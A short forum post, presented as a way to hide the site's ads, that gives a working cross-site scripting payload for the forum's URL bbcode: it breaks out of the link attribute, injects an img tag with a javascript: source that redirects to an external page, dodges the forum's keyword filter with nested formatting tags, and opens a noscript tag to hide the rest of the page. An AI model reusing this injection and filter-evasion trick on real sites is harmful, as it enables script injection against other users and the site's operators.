Solution to the annoying ads on this site

[url]http://spiff.tripnet.se/~iczelion/[/url]

to

[url]http://spiff.tripnet.se/~iczelion/[/url]"><img src="java[i][b][/i][/b]script:window.location='http://spiff.tripnet.se/~iczelion/'"><noscript>

[edit] there shouldn't be a space between javascript, the forum is splitting it.
